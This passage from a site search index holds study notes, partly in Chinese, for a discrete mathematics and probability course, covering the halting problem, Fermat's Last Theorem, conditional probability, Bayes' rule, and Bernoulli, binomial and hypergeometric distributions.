<p>\u505c\u673a\u95ee\u9898\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <p>\u7ed9\u5b9a\u4e00\u4e2a\u4efb\u610f\u7a0b\u5e8f\u548c\u5b83\u7684\u8f93\u5165\uff0c\u5224\u65ad\u8fd9\u4e2a\u7a0b\u5e8f\u5728\u7ed9\u5b9a\u8f93\u5165\u4e0b\u662f\u5426\u4f1a\u6700\u7ec8\u505c\u6b62\uff08\u5373\u6b63\u5e38\u7ed3\u675f\u8fd0\u884c\uff09\u8fd8\u662f\u5c06\u6c38\u8fdc\u8fd0\u884c\u4e0b\u53bb\uff08\u5373\u9677\u5165\u65e0\u9650\u5faa\u73af\uff09\u3002</p> <p>\u56fe\u7075\u8bc1\u660e\u4e86\u8fd9\u4e2a\u95ee\u9898\u7684\u4e0d\u53ef\u89e3\u6027\uff0c\u4ed6\u7684\u8bc1\u660e\u65b9\u6cd5\u662f\u901a\u8fc7\u6784\u9020\u4e00\u4e2a\u77db\u76fe\u6765\u5c55\u793a\u3002\u4ee5\u4e0b\u662f\u505c\u673a\u95ee\u9898\u4e0d\u53ef\u89e3\u7684\u8bc1\u660e\u6982\u8ff0\uff1a</p> <ol> <li>\u5047\u8bbe\u5b58\u5728\u4e00\u4e2a\u53ef\u4ee5\u89e3\u51b3\u505c\u673a\u95ee\u9898\u7684\u56fe\u7075\u673a\uff1a\u6211\u4eec\u5047\u8bbe\u5b58\u5728\u4e00\u4e2a\u56fe\u7075\u673aH\uff0c\u5b83\u80fd\u591f\u5224\u65ad\u4efb\u4f55\u7a0b\u5e8fP\u548c\u8f93\u5165I\u662f\u5426\u4f1a\u5728\u6709\u9650\u65f6\u95f4\u5185\u505c\u6b62\u3002</li> <li>\u6784\u9020\u4e00\u4e2a\u65b0\u56fe\u7075\u673aD\uff1a\u8bbe\u8ba1\u4e00\u4e2a\u56fe\u7075\u673aD\uff0c\u5b83\u63a5\u53d7\u53e6\u4e00\u4e2a\u56fe\u7075\u673aP\u7684\u63cf\u8ff0\u4f5c\u4e3a\u8f93\u5165\u3002D\u7684\u5de5\u4f5c\u65b9\u5f0f\u662f\uff0c\u9996\u5148\u7528P\u7684\u63cf\u8ff0\u548cP\u7684\u8f93\u5165I\u4f5c\u4e3a\u8f93\u5165\u8c03\u7528H\u3002\u5982\u679cH\u5224\u65adP\u4f1a\u5728\u8f93\u5165I\u4e0b\u505c\u6b62\uff0c\u90a3\u4e48D\u8fdb\u5165\u4e00\u4e2a\u65e0\u9650\u5faa\u73af\uff1b\u5982\u679cH\u5224\u65adP\u4e0d\u4f1a\u505c\u6b62\uff0c\u90a3\u4e48D\u505c\u6b62\u3002</li> <li>\u5f15\u53d1\u77db\u76fe\uff1a\u73b0\u5728\uff0c\u6211\u4eec\u8ba9D\u4ee5\u5176\u81ea\u8eab\u7684\u63cf\u8ff0\u4f5c\u4e3a\u8f93\u5165\u8fd0\u884c\u3002\u6839\u636eH\u7684\u5224\u65ad\uff0c\u6709\u4e24\u79cd\u60c5\u51b5\uff1a<ul> <li>\u5982\u679cD\u4f1a\u5728\u5176\u81ea\u8eab\u63cf\u8ff0\u4f5c\u4e3a\u8f93\u5165\u65f6\u505c\u6b62\uff0c\u90a3\u4e48\u6839\u636eD\u7684\u5b9a\u4e49\uff0c\u5b83\u5e94\u8be5\u8fdb\u5165\u65e0\u9650\u5faa\u73af\u3002</li> <li>\u5982\u679cD\u4f1a\u5728\u5176\u81ea\u8eab\u63cf\u8ff0\u4f5c\u4e3a\u8f93\u5165\u65f6\u8fdb\u5165\u65e0\u9650\u5faa\u73af\uff0c\u90a3\u4e48\u6839\u636eD\u7684\u5b9a\u4e49\uff0c\u5b83\u5e94\u8be5\u505c\u6b62\u3002</li> </ul> </li> </ol> <p>\u65e0\u8bba\u54ea\u79cd\u60c5\u51b5\uff0c\u90fd\u4f1a\u5bfc\u81f4\u4e00\u4e2a\u77db\u76fe\uff0c\u56e0\u6b64\u6211\u4eec\u7684\u5047\u8bbe\uff08\u5b58\u5728\u4e00\u4e2a\u53ef\u4ee5\u89e3\u51b3\u505c\u673a\u95ee\u9898\u7684\u56fe\u7075\u673aH\uff09\u662f\u9519\u8bef\u7684\u3002</p> <p>\u56e0\u6b64\uff0c\u505c\u673a\u95ee\u9898\u662f\u4e0d\u53ef\u89e3\u7684\uff0c\u8fd9\u610f\u5473\u7740\u6ca1\u6709\u7b97\u6cd5\u53ef\u4ee5\u51c6\u786e\u5730\u5224\u65ad\u4efb\u610f\u7a0b\u5e8f\u662f\u5426\u4f1a\u5728\u4efb\u610f\u8f93\u5165\u4e0b\u505c\u6b62\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/12-Self_Reference_and_Computability/#ii-godels-incompleteness-theorem","title":"II Godel\u2019s Incompleteness Theorem","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/12-Self_Reference_and_Computability/#ii1-fermats-last-theorem","title":"II.1 Fermat\u2019s Last Theorem","text":"<p>\u201c\u8d39\u9a6c\u5927\u5b9a\u7406\u201d\uff08Fermat\u2019s Last Theorem\uff09\uff0c\u8fd9\u662f\u6570\u5b66\u53f2\u4e0a\u4e00\u4e2a\u975e\u5e38\u8457\u540d\u7684\u672a\u89e3\u51b3\u95ee\u9898\uff0c\u7531\u6cd5\u56fd\u6570\u5b66\u5bb6\u76ae\u57c3\u5c14\u00b7\u5fb7\u00b7\u8d39\u9a6c\uff08Pierre de Fermat\uff09\u57281637\u5e74\u63d0\u51fa\uff1b\u5b9a\u7406\u5185\u5bb9\u662f\uff1a</p> <p></p> <p>\u8d39\u9a6c\u5728\u4ed6\u7684\u7b14\u8bb0\u8fb9\u7f18\u5199\u9053\u4ed6\u53d1\u73b0\u4e86\u4e00\u4e2a\u201c\u771f\u6b63\u5947\u5999\u7684\u8bc1\u660e\u201d\uff0c\u4f46\u662f\u8fd9\u4e2a\u8bc1\u660e\u592a\u957f\u4e86\uff0c\u65e0\u6cd5\u5199\u5728\u9875\u8fb9\u7684\u7a7a\u767d\u5904\uff08\u8c01\u77e5\u9053\u771f\u7684\u5047\u7684\uff09\u3002</p> <p>\u9057\u61be\u7684\u662f\uff0c\u8d39\u9a6c\u6ca1\u6709\u7559\u4e0b\u4efb\u4f55\u8bc1\u660e\u7684\u8bb0\u5f55\uff0c\u56e0\u6b64\u8fd9\u4e2a\u731c\u60f3\u6210\u4e3a\u4e86\u6570\u5b66\u754c\u6570\u767e\u5e74\u7684\u96be\u9898\uff1b\u76f4\u52301994\u5e74\uff0c\u82f1\u56fd\u6570\u5b66\u5bb6\u5b89\u5fb7\u9c81\u00b7\u6000\u5c14\u65af\uff08Andrew Wiles\uff09\u624d\u6700\u7ec8\u8bc1\u660e\u4e86\u8fd9\u4e2a\u5b9a\u7406\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/12-Self_Reference_and_Computability/#ii2-formal-system","title":"II.2 Formal System","text":"<p>\u5f62\u5f0f\u7cfb\u7edf\u8fd8\u6ca1\u641e\u660e\u767d\uff0c\u5148 <sub>\u5495\u5495\u5495</sub> \u4e86</p>","tags":["DMPT","notes"]},{"location":"note/cs70/13-Introduction_of_Discrete_Probability/","title":"13 Introduction of Discrete Probability","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/13-Introduction_of_Discrete_Probability/#i-random-experiments-probability-spaces","title":"I Random Experiments &amp; Probability Spaces","text":"<p>Quote</p> <p>Each element of the sample space is assigned a probability which tells us how likely the outcome is to occur when we actually perform the experiment.</p> <p>Typically, a random experiment consists of drawing a sample of k elements from a set S of cardinality n.</p> <p>A probability space is a sample space \u2126, together with a probability P[\u03c9] (often also denoted as Pr[\u03c9]) for each sample point \u03c9, such that</p> <ul> <li>(Non-negativity): 0 \u2264 P[\u03c9] \u2264 1 for all \u03c9 \u2208 \u2126. </li> <li>(Sum to 1): \u2211 \u03c9\u2208\u2126 P[\u03c9] = 1, i.e., the sum of the probabilities over all outcomes is 1.</li> </ul> <p>Formally, an event A made of some sample from \u2126 is just a subset of the sample space \u2126, i.e., A \u2286 \u2126</p> <p>For any event A \u2286 \u2126, we define the probability of A to be</p> \\[ P[A]=\\sum_{\\omega \\in A}P[\\omega] \\]","tags":["DMPT","notes"]},{"location":"note/cs70/13-Introduction_of_Discrete_Probability/#ii-example","title":"II Example","text":"<p>\u5bf9\u4e8e\u666e\u901a\u7684\u53e4\u5178\u6982\u578b\u5927\u5bb6\u5728\u9ad8\u4e2d\u5c31\u5df2\u7ecf\u5b66\u4e60\u8fc7\uff0c\u4e0d\u518d\u6d89\u53ca\uff0c\u8fd9\u91cc\u8bb0\u5f55\u51e0\u4e2a\u6bd4\u8f83\u6709\u610f\u601d\u7684\u4f8b\u5b50\uff1a</p>","tags":["DMPT","notes"]},{"location":"note/cs70/13-Introduction_of_Discrete_Probability/#ii1-birthday-paradox","title":"II.1 Birthday Paradox\uff08\u751f\u65e5\u6096\u8bba\uff09","text":"<p>\u6bd4\u8f83\u957f\uff0c\u5c31\u653e\u5f20\u622a\u56fe\uff0c\u4f46\u662f\u7ed3\u8bba\u5c31\u662f\uff0c23 \u4e2a\u4eba\u4e2d\uff0c\u6709\u4e24\u4eba\u540c\u4e00\u5929\u751f\u65e5\u6982\u7387\u5c31\u662f 50%\u4ee5\u4e0a\uff1b60 \u4e2a\u4eba\u4e2d\uff0c\u6709\u4e24\u4eba\u540c\u4e00\u5929\u751f\u65e5\u7684\u6982\u7387\u5c31\u8fbe\u5230\u4e86 99% ! !</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/13-Introduction_of_Discrete_Probability/#ii2-the-monty-hall-problem","title":"II.2 The Monty Hall Problem","text":"<p>\u8be6\u7ec6\u5185\u5bb9\u53ef\u4ee5\u81ea\u884c\u641c\u7d22\uff1b\u6982\u62ec\u5c31\u662f\uff1a\u5609\u5bbe(contestant) \u8981\u8fdb\u884c\u4e09\uff08A\u3001B\u3001C\uff09\u9009\u4e00\u83b7\u5956(price) \uff0c\u9009\u62e9\uff08\u5047\u5982\u9009\u62e9\u4e86 A\uff09\u8fc7\u540e\u4e3b\u6301\u4eba(hoster) \u544a\u8bc9 ta \u5269\u4e0b\u4e24\u4e2a\u4e2d\u9519\u8bef\u7684\u90a3\u4e2a\uff08\u4f8b\u5982\u662f C\uff09\uff0c\u90a3\u4e48 ta \u5e94\u8be5\u7ee7\u7eed\u9009\u62e9 A \u8fd8\u662f\u6539\u9009 B \u5462\uff1f\u5bf9\u4e8e\u6709\u6240\u9009\u62e9\u7684\u5730\u65b9\u6211\u4eec\u8ba4\u4e3a\u6bcf\u79cd\u53ef\u80fd\u6027\u76f8\u540c\uff1a\u5609\u5bbe\u6700\u521d\u7684\u9009\u62e9\u662f\u968f\u673a\u7684\uff0c\u5982\u679c\u5609\u5bbe\u4e00\u5f00\u59cb\u9009\u5bf9\u4e86\uff0c\u5219\u4e3b\u6301\u4eba\u4ece\u5269\u4f59\u4e24\u4e2a\u95e8\u968f\u673a\u9009\u53d6\u3002</p> <p>\u770b\u8d77\u6765\uff0c\u4e8c\u8005\uff08A\u3001B \uff09\u4f3c\u4e4e\u5e76\u6ca1\u6709\u533a\u522b\uff0c\u6bd5\u7adf\u53ea\u662f\u5c06 C \u6392\u9664\u4e86\uff1f</p> <p>\u4f46\u662f\u4f60\u770b\u770b\uff0cA \u662f\u6700\u5f00\u59cb\u5c31\u9009\u4e86\u7684\uff0c\\(\\frac{1}{3}\\) \u6ca1\u8dd1\u4e86\uff1bC \u5df2\u7ecf\u88ab\u6392\u9664\u4e86\uff0c\u6982\u7387\u80af\u5b9a\u662f 0\uff1b\u90a3\u4f60\u770b\u770b\u8fd9\u4e2a B \u7684\u6982\u7387\u4e0d\u5c31\u662f \\(\\frac{2}{3}\\) \u561b\u3002</p> <p>\u90a3\u65e0\u7591\uff0c\u9009 B\u3002</p> <p></p> <p>\u6709\u70b9\u5947\u602a\uff0c\u4f46\u662f\u2026\u2026\u8fd9\u4e2a\u6761\u4ef6\u6982\u7387\u6211\u4eec\u4f1a\u5728\u540e\u9762\u8bb2\u89e3\uff1b\u56e0\u4e3a hoster \u6392\u9664\u9519\u8bef\u7684\u9009\u9879\u8fd9\u4e2a\u6982\u7387\u4e3a 1 \uff0c\u5bfc\u81f4\u4e86\u6982\u7387\u7684\u6539\u53d8\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/13-Introduction_of_Discrete_Probability/#iii-words","title":"III Words","text":"<p>\u4e0b\u9762\u662f\u4e00\u4e9b\u5e38\u89c1\u7684\u540d\u8bcd</p> <ol> <li>H(head)/T(tail)  \u786c\u5e01\u6b63/\u53cd\u9762</li> <li>Coin \u786c\u5e01</li> <li>Fair Coin \u516c\u5e73\u786c\u5e01</li> <li>Fair Dice \u516c\u5e73\u9ab0\u5b50</li> <li>Loaded Coin \u4f5c\u5f0a\u786c\u5e01</li> <li>Loaded Dice \u4f5c\u5f0a\u9ab0\u5b50</li> <li>Toss \u629b\u63b7</li> <li>Roll Die/Dice \u63b7\u9ab0\u5b50\uff08\u540e\u8005\u4e3a pl\uff09</li> <li>Heads \u6b63\u9762</li> <li>Tails \u53cd\u9762</li> <li>Side \u9762</li> <li>Face Value \u9762\u503c</li> <li>Probability Space \u6982\u7387\u7a7a\u95f4</li> <li>Sample Space \u6837\u672c\u7a7a\u95f4</li> <li>Event \u4e8b\u4ef6</li> <li>Outcomes \u7ed3\u679c</li> <li>Equally Likely \u7b49\u53ef\u80fd</li> <li>Combinations \u7ec4\u5408</li> <li>Permutations \u6392\u5217</li> <li>\\((^{n}_{x}) := C^{x}_{n}\\)</li> <li>Roulette \u8f6e\u76d8\u8d4c\u6ce8</li> </ol>","tags":["DMPT","notes"]},{"location":"note/cs70/14-Conditional_Probability/","title":"14 Conditional Probability","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/14-Conditional_Probability/#i-conditional-probability","title":"I Conditional Probability","text":"<p>[!definition 14.1]</p> <p>(Conditional Probability). For events A,B \u2286 \u2126 in the same probability space such that P[B] &gt; 0, the conditional probability of A given B is </p> \\[ P[A|B] = \\sum_{\\omega \\in A \\cap B} P[\\omega| B] = \\frac{P[A \\cap B]}{P[B]} \\] <p></p> <p>Example</p> <p>Card Dealing  \u5728\u6ca1\u6709\u5927\u5c0f\u738b\u7684\u6251\u514b\uff0852 \u5f20\uff0c\u4ee5\u540e\u6211\u4eec\u9ed8\u8ba4\u5982\u6b64 \uff09\u4e2d\u968f\u673a\u62bd\u4e24\u5f20\u724c\uff0c\u7b2c\u4e00\u5f20\u4e3a A\uff0c\u90a3\u4e48\u7b2c\u4e8c\u5f20\u4f9d\u65e7\u4e3a A \u7684\u6982\u7387\u4e3a\uff1f</p> <p>\u7b54\u6848\uff1a\\(\\frac{\\frac{4*3}{52*51}}{\\frac{4}{52}} = \\frac{3}{51}\\)</p>","tags":["DMPT","notes"]},{"location":"note/cs70/14-Conditional_Probability/#ii-bayesian-inference","title":"II Bayesian Inference \uff08\u8d1d\u53f6\u65af\u63a8\u7406\uff09","text":"<p>Info</p> <p>Conditional probability is at the heart of a subject called Bayesian inference , used extensively in fields such as machine learning, communications and signal processing. Bayesian inference is a way to update knowledge after making an observation.</p> <p>We may have an estimate of the probability of a given event A. After event B occurs, we can  update  this estimate to P[A | B]. In this interpretation, P[A] can be thought of as a prior probability: our assessment of the likelihood of an event of interest, A, before making an observation. It reflects our prior knowledge. P[A | B] can be interpreted as the posterior probability of A after the observation. It reflects our updated knowledge.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/14-Conditional_Probability/#iii-important-example","title":"III Important example","text":"<p>Here comes an important example.</p> <p>Example</p> <p>A pharmaceutical company is marketing a new test for a certain medical disorder. According to clinical trials, the test has the following properties:</p> <ul> <li> <p>When applied to an affected person, the test comes up positive in 90% of cases, and negative in 10% (these are called \u201cfalse negatives\u201d).</p> </li> <li> <p>When applied to a healthy person, the test comes up negative in 80% of cases, and positive in 20% (these are called \u201cfalse positives\u201d).</p> </li> </ul> <p>Suppose that the incidence of the disorder in the US population is 5%; this is our prior knowledge. When a random person is tested and the test comes up positive, how can we update the probability that the person has the disorder? [!HELP]</p> <p>\u7528\u65b0\u51a0\u75ab\u60c5\u4f5c\u4e3a\u89e3\u91ca\uff1a\u6211\u4eec\u7684\u68c0\u6d4b\u8bd5\u5242\u5bf9\u4e8e\u672a\u611f\u67d3\u8005\u7684\u51c6\u786e\u7387\u4e3a 80%\uff0c\u5bf9\u4e8e\u611f\u67d3\u8005\u51c6\u786e\u7387\u4e3a 90%\uff0c\u73b0\u5728\u5b9e\u9645\u4e0a\u4e00\u7fa4\u8db3\u591f\u591a\u7684\u4eba\u4e2d\u6709%5 (prior probability) \u7684\u4eba\u88ab\u611f\u67d3\uff0c\u90a3\u4e48\u6211\u4eec\u7ed9\u8fd9\u4e9b\u4eba\u505a\u68c0\u6d4b\u89c2\u5bdf\u5230\u7684\u611f\u67d3\u7387 (posterior probability) \u4e3a\uff1f</p> <p>\u97e6\u6069\u56fe\u5982\u4e0b</p> <p></p> <p>\u8fd9\u4e2a\u8fc7\u7a0b\u6211\u4eec\u4f7f\u7528\u9ad8\u4e2d\u6761\u4ef6\u6982\u7387\u7684\u77e5\u8bc6\u5c31\u53ef\u4ee5\u89e3\u51b3\uff0c\u65b9\u6cd5\u5982\u4e0b\uff1b\u4f46\u8fd9\u4e0d\u662f\u6211\u4eec\u8bb2\u8ff0\u7684\u91cd\u70b9\uff0c\u6240\u4ee5\u4e0d\u505a\u8be6\u7ec6\u8bb2\u89e3\uff1b\u4f46\u8fd8\u8bf7\u4ed4\u7ec6\u89c2\u770b\uff0c\u6211\u4eec\u518d\u4e0b\u9762\u4ecd\u7136\u4f1a\u4f7f\u7528\u5230\u3002</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/14-Conditional_Probability/#iv-bayes-rule-and-total-probability-rule","title":"IV Bayes\u2019 Rule and Total Probability Rule","text":"<p>Definition</p> <p>Equations (1) and (2) are very useful in their own right. The former is called Bayes\u2019 Rule and the latter is called the Total Probability Rule. Sometimes, we use Equation (3) directly.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/14-Conditional_Probability/#iv1-example-balls-and-bins","title":"IV.1 Example (Balls and Bins)","text":"<p>Is the answer \\(\\frac{2}{3}\\) , since we know that there are a total of three white balls, two of which are in Bin 1?</p> <p>No! we can see the picture shown below:</p> <p></p> <p>Yes! The answer is \\(\\frac{4}{9}\\). Now we use Bayes\u2019 Rule and Total Probability Rule to solve it:</p> <p></p> <p></p> <p>Of course, we can use Equation (3) directly.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/14-Conditional_Probability/#iv2-generalization","title":"IV.2 Generalization","text":"<p>[!Definition 14.2] </p> <p>(Partition of an event). We say that an event A is partitioned into n events A1,...,An if 1. A = A1 \u222aA2 \u222a\u00b7\u00b7\u00b7 \u222aAn, and 2. Ai \u2229Aj = \u2205 for all \\(i \\neq j\\) (i.e., A1,...,An are mutually exclusive)</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/14-Conditional_Probability/#v-combinations-of-events","title":"V Combinations of Events","text":"<p>Quote</p> <p></p> <p>In this section, we discuss some situations where it can be done.</p> <p>Let\u2019s start with independent events, for which intersections are quite simple to compute.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/14-Conditional_Probability/#v1-independent-events","title":"V.1 Independent events","text":"<p>We all know that independent events A&amp;B means that P[A\u2229B] = P[A]\u00d7P[B].</p> <p>Then we can get that \\(P[A] = P[A|B]\\) since A has nothing to do with B; by a symmetrical argument, we also have P[B | A] = P[B] provided  P[A] &gt; 0.</p> <p>Example</p> <p>Pairwise Independent but Not Mutually Independent Events  Suppose you toss a fair coin twice and let A be the event that the first flip is H and B be the event that the second flip is H. Now let C be the event that both flips are the same (i.e., both H\u2019s or both T\u2019s).</p> <p>then I want to tell you that even though A, B and C are not mutually independent, every pair of them are independent. You can prove it easily.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/14-Conditional_Probability/#v2-intersections-of-events","title":"V.2 Intersections of Events","text":"<p>[!THEOREM14.1]</p> <p>( Product Rule a.k.a chain rule ) </p>","tags":["DMPT","notes"]},{"location":"note/cs70/14-Conditional_Probability/#v21-the-monty-hall-problem-revisit","title":"V.2.1 The Monty Hall Problem Revisit","text":"<p>We use it to solve the problem in last note: The Monty Hall Problem</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/14-Conditional_Probability/#v22-poker-hands","title":"V.2.2 Poker Hands","text":"<p>Info</p> <p>In poker, players form sets of five playing cards, called hands, according to the rules of the game. Each hand has a rank, which is compared against the ranks of other hands participating in the showdown to decide who wins the pot.</p> <p></p> <p>-- come from wiki/List_of_poker_hands</p> <p>Let\u2019s use the Product Rule to compute the probability of a flush in a different way. This is equal to 4\u00d7P[A], where A is the probability of a Hearts flush.</p> <p>We can write \\(A = \\cap^{5}_{i=1} A_{i}\\) , where Ai is the event that the ith card we pick is a Heart. So we have</p> \\[ P[A] = P[A_{1}]\u00d7P[A_{2} | A_{1}]\u00d7\u00b7\u00b7\u00b7 \u00d7P[A_{5} | \\cap^{4}_{i=1}Ai ] \\] <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/14-Conditional_Probability/#v3-unions-of-events","title":"V.3 Unions of Events","text":"<p>Suppose that you are in Las Vegas, and you spy a new game with the following rules. You pick a number between 1 and 6. Then three dice are thrown. You win if and only if your number comes up on at least one of the dice. Since every number owns same probability namely \\(\\frac{1}{6}\\) , so the probability</p> <p>of winning is \\(\\frac{1}{6}*3 = \\frac{1}{2}\\) , right?</p> <p>No!</p> <p>Well, suppose instead that the casino rolled six dice, and again you win if and only if your number comes up at least once. Then the analogous calculation would say that you win with probability \\(\\frac{1}{6}*6 = 1\\) , i.e., certainly! The situation becomes even more ridiculous when the number of dice gets bigger than 6 \u2026</p> <p>[!THEOREM 14.2]</p> <p>(Inclusion-Exclusion). Let A1,...,An be events in some probability space, where n \u2265 2. Then, we have </p> <p>Using Inclusion-Exclusion,  we can get that the probability for you to win is nearly 0.42, rather than 0.5.</p> <p>[!THEOREM 14.3]</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/14-Conditional_Probability/#vi-practice","title":"VI Practice","text":"<p>Q 1 Roll die</p> <p>If we roll a regular, 6-sided die 5 times. What is the probability that at least one value is observed more than once?</p> <p>Hint</p> <p>It's easier to get the opposite.</p> <p>The answer is \\(P[A] = 1-P[\\overline{A}]=1-\\frac{A^{5}_{6}}{6^{5}}=1-\\frac{5!}{6^{4}}\\)</p> <p>Q 2 Independent Complement</p> <p>Let \u2126 be a sample space, and let A,B \u2286 \u2126 be two independent events, then prove or disprove</p> <p>(a) A and B must be independent.</p> <p>(b) A and B must be independent.</p> <p>(c ) A and A must be independent.</p> <p>(d) It is possible that A=B</p> <p>Solution:</p> <p></p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/15-Distribution_and_Expectation/","title":"15 Distribution and Expectation","text":"<p>If we toss a fair coin n times, then there are \\(2^{n}\\) possible outcomes, each of which is equally likely and has probability \\(\\frac{1}{2^{n}}\\) .</p> <p>But now we want to know what is the number of heads in n coin tosses; call this number X. For n = 4, the result is shown in the following picture</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/15-Distribution_and_Expectation/#i-random-variables","title":"I Random Variables\uff08\u968f\u673a\u53d8\u91cf\uff09","text":"<p>[!DEFINITION 15.1]</p> <p>( Random Variable ). A random variable X on a sample space \u2126 is a function X : \u2126 \u2192 R that assigns to each sample point \u03c9 \u2208 \u2126 a real number X(\u03c9).(abbreviated r.v.).</p> <p>As we see from the example above, a random variable X typically does not have a definitive value, but instead only has a probability distribution over the set of possible values X can take, which is why it is called random.</p> <p>Until further notice, we will restrict our attention to random variables that are  discrete , i.e., they take values in a range that is finite or countably infinite.</p> <p>Attention</p> <p>Note that the term \u201crandom variable\u201d is really something of a misnomer: it is a function so there is nothing random about it and it is definitely not a variable!</p>","tags":["DMPT","notes"]},{"location":"note/cs70/15-Distribution_and_Expectation/#i1-fixed-points-of-permutations","title":"I.1 Fixed Points of Permutations\uff08\u56fa\u5b9a\u70b9\u6392\u5217\uff09","text":"<p>[!DEFINITION 15.2]</p> <p>Permutation : In mathematics, a permutation of a set is, loosely speaking, an arrangement of its members into a sequence or linear order, or if the set is already ordered, a rearrangement of its elements. The word \"permutation\" also refers to the act or process of changing the linear order of an ordered set.</p> <p>Question</p> <p>Suppose we collect the homeworks of n students, randomly shuffle them, and return them to the students. How many students receive their own homework?</p> <p>\u8fd9\u662f\u4e00\u4e2a\u6bd4\u8f83\u7ecf\u5178\u7684\u95ee\u9898\uff0c\u5373\u8ba8\u8bba\u5c06\u4e00\u4e2a\u5e8f\u5217\u91cd\u6392\u540e\u6ca1\u6709\u6539\u53d8\u4f4d\u7f6e\u7684\u70b9\u7684\u6570\u91cf\uff0c\u6211\u4eec\u5c06\u8fd9\u4e2a\u6570\u5b57\u8bbe\u4e3a \\(X_{n}\\) \uff0c\u4e0b\u9762\u662f\u5f53 n = 3 \u65f6\u7684\u6620\u5c04\u60c5\u51b5\uff1a</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/15-Distribution_and_Expectation/#ii-probability-distribution","title":"II Probability Distribution\uff08\u6982\u7387\u5206\u5e03\uff09","text":"<p>Since a random variable is defined on a probability space, we can calculate these probabilities given the probabilities of the sample points. Let a be any number in the range of a random variable X. Then the set \\(\\{\\omega \\in\\Omega: X(\\omega)=a\\}\\) is an event in the sample space (because it is a subset of \u2126). We usually abbreviate this event to simply \u201cX = a\u201d , and the probability of it is P[X = a].</p> <p>[!DEFINITION 15.3]</p> <p>(Distribution ). The distribution of a discrete random variable X is the collection of values {(a,P[X = a]) : a \u2208 A }, where A is the set of all possible values taken by X.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/15-Distribution_and_Expectation/#ii1-bernoulli-distribution","title":"II.1 Bernoulli Distribution\uff08\u4e24\u70b9\u5206\u5e03/\u4f2f\u52aa\u5229\u5206\u5e03\uff09","text":"<p>A simple yet very useful probability distribution is the Bernoulli distribution of a random variable which takes value in {0,1}:</p> \\[ P[X = i] = \\begin{cases} p,\\enspace \\,\\qquad(i=1) \\\\ 1-p,\\quad(i=0) \\end{cases} \\] <p>We say that X is distributed as a Bernoulli random variable with parameter p, and write</p> \\[ X \u223c Bernoulli(p)\\quad or\\quad X \u223c Ber(p). \\]","tags":["DMPT","notes"]},{"location":"note/cs70/15-Distribution_and_Expectation/#ii2-binomial-distribution","title":"II.2 Binomial Distribution\uff08\u4e8c\u9879\u5206\u5e03\uff09","text":"<p>If we conduct Bernoulli Distribution for n times, we find that the</p> \\[ P[x=i] = (^{n}_{i})p^{i}(1-p)^{n-i},\\quad for\\quad i= 0,1,2 \\dots,n \\] <p>which is named Binomial Distribution and we write</p> \\[X \u223c Bin(n, p),\\]","tags":["DMPT","notes"]},{"location":"note/cs70/15-Distribution_and_Expectation/#ii3-hypergeometric-distribution","title":"II.3 Hypergeometric Distribution\uff08\u8d85\u51e0\u4f55\u5206\u5e03\uff09","text":"<p>Consider an urn containing N = B + W balls, where B balls are black and W are white. Suppose you randomly sample n \u2264 N balls from the urn , and let X denote the number of black balls in your sample. - if you put it back i.e. get ball  with replacement, that is Binomial Distribution - if you don't put it back i.e.  without replacement, then we call it  Hypergeometric Distribution we can get that</p> \\[ \\begin{cases} P[Y=k] = \\frac{|E_{k}|}{|\\Omega|} \\\\ |\\Omega| = (^{N}_{n}) \\\\ |E_{k}| = (^{B}_{k})(^{N-B}_{n-k}) \\end{cases} \\] <p>This probability distribution is called the hypergeometric distribution with parameters N,B,n, and write:   \\(Y \u223c Hypergeometric(N, B, n)\\)</p> <p>Attention</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/15-Distribution_and_Expectation/#multiple-random-variables-and-independence","title":"Multiple Random Variables and Independence","text":"<p>[!DEFINITION 15.4]</p> <p>The joint distribution of two discrete random variables X and Y is the collection of values {((a,b),P[X = a,Y = b]) : a \u2208 A , b \u2208 B}, where A is the set of all possible values taken by X and B is the set of all possible values taken by Y.</p> <p>Given a joint distribution of X and Y, the distribution P[X = a] of X is called the marginal distribution of X, and can be found by summing over the values of Y.</p> \\[ P[X=a] = \\sum_{b \\in B} P[X= a, Y = b] \\] <p>and if P[X=a, Y=b] = P[X=a]P[Y=b], we say that X = a and Y = b are independent for all values a,b.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/15-Distribution_and_Expectation/#expectation","title":"Expectation\uff08\u671f\u671b\uff09","text":"<p>\u6211\u4eec\u5728\u9ad8\u4e2d\u5e94\u5f53\u90fd\u5df2\u7ecf\u5b66\u4e60\u8fc7 \u6570\u5b66\u671f\u671b \uff0c\u56e0\u6b64\u8fd9\u91cc\u53ea\u9648\u5217\u91cd\u8981\u7ed3\u8bba\u800c\u7701\u7565\u8bc1\u660e\u8fc7\u7a0b\u3002</p> <p>[!DEFINITION 15.5]</p> <p>(Expectation). The expectation of a discrete random variable X is defined as  \\(E(X) = \\sum_{a \\in A} a\u00d7P[X = a]\\) [!THEOREM (many)]</p> <p>(15.1) For any two random variables X and Y on the same probability space, we have  \\(E[X+Y] = E[X] + E[Y]\\quad E[cX] = cE[X]\\)</p> <p>(15.2) \\(E[f(x)] = \\sum_{x}f(x)P_{X}[X=x]\\)## Practice</p> <p>Q 1 Diversify Your Hand</p> <p>You are dealt 5 cards from a standard 52 card deck. Let X be the number of distinct values in your hand. For instance, the hand (A, A, A, 2, 3) has 3 distinct values. - (a) Calculate E[X]. (Hint: Consider indicator variables Xi representing whether i appears in the hand.)  - (b) Calculate Var(X) </p> <p>Help</p> 